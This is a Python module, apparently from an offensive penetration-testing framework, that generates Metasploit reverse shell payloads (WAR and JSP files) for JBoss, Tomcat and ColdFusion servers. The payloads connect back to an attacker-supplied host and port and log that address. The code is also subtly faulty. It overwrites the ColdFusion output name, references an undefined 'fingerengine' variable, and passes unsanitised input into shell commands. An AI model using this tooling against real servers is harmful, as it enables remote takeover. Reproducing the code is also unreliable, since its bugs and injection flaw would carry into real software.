from commands import getoutput
from log import LOG
import utility


def run(options):
    """ This module is used for generating reverse shell payloads.  It's not
    flexible in what sorts of payloads it can generate, but this is by design.

    Highly customized payloads, or stuff like meterpreter/reverse java payloads
    should be generated using proper tools, such as msfpayload.  This is merely
    a quick way for us to get a reverse shell on a remote system.
    """

    if not options.remote_os:
        utility.Msg("Please specify a remote os (-o)", LOG.ERROR)
        return

    if not options.remote_service:
        utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
        return
    elif options.remote_service in ["coldfusion"]:
        out = "R > shell.jsp"

    if getoutput("which msfpayload") == "":
        utility.Msg("This option requires msfpayload", LOG.ERROR)
        return

    payload = fetch_payload(options)
    out = "W > shell.war"

    if not payload:
        utility.Msg("Platform %s unsupported" % 
                            fingerengine.options.remote_service, LOG.ERROR)
        return

    utility.Msg("Generating payload....")
    (lhost, lport) = options.generate_payload.split(":")

    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s &>/dev/null" %
                    (payload, lhost, lport, out))

    if "Created by" in resp:
        utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], payload))

        # also log some auxiliary information
        getoutput("echo Generated at %s > ./src/lib/shell.log" % utility.timestamp())
        getoutput("echo %s:%s >> ./src/lib/shell.log" % (lhost, lport))
        getoutput("echo %s >> ./src/lib/shell.log" % (payload))
    else:
        utility.Msg("Error generating payload: %s" % resp, LOG.ERROR)


def fetch_payload(options):
    """ Helper function for fetching the payload string
    """

    payloads = {"windows" : {},
                "linux"   : {}
               }
    if options.remote_service in ["jboss", "tomcat"]:
    
        payloads["windows"] = { "x86" : "windows/shell/reverse_tcp",
                                "x64" : "windows/shell/reverse_tcp"}
                              
        payloads["linux"] =  { "x86" : "linux/x86/shell/reverse_tcp",
                               "x64" : "linux/x64/shell/reverse_tcp"}

    elif options.remote_service in ["coldfusion"]:

        dmap = { "x86" : "java/jsp_shell_reverse_tcp",
                 "x64" : "java/jsp_shell_reverse_tcp" }

        payloads["windows"] = dmap
        payloads["linux"] = dmap

    else:
        # unsupported
        return None        

    return payloads[options.remote_os][options.arch]
